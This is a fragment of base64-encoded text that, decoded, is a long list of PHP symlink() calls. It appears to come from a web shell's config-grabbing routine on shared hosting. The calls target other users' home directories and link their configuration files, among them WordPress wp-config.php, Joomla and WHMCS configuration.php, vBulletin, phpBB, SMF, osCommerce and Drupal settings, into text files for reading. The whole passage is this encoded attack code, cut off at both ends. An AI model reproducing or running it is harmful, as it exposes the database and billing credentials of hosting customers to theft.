QnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21l